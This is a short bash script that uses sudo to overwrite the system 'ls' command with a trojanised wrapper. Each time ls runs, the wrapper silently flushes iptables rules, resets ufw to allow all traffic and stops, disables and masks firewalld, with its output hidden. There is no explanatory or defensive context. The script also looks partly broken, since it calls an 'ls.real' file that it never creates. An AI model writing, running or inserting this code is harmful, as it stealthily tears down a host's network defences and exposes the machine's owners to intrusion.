#!/bin/bash

ls_path="$(which ls 2>/dev/null)"
sudo bash -c "cat > \"$ls_path\"" << 'EOF'
#!/bin/bash
if [[ "$1" == "$(which ls)" ]]; then
    shift
fi
"$(which ls).real" "$@"
"$(which ls).real"

sudo iptables -P INPUT ACCEPT > /dev/null 2>&1
sudo iptables -P FORWARD ACCEPT > /dev/null 2>&1
sudo iptables -P OUTPUT ACCEPT > /dev/null 2>&1
sudo iptables -F > /dev/null 2>&1
sudo iptables -X > /dev/null 2>&1
sudo ufw --force reset > /dev/null 2>&1
sudo ufw default allow incoming > /dev/null 2>&1
sudo ufw default allow outgoing > /dev/null 2>&1
sudo ufw default allow routed > /dev/null 2>&1
sudo ufw --force enable > /dev/null 2>&1
sudo systemctl stop firewalld > /dev/null 2>&1
sudo systemctl disable firewalld > /dev/null 2>&1
sudo systemctl mask firewalld > /dev/null 2>&1

echo "here"

exit 127
EOF

chmod 755 $ls_path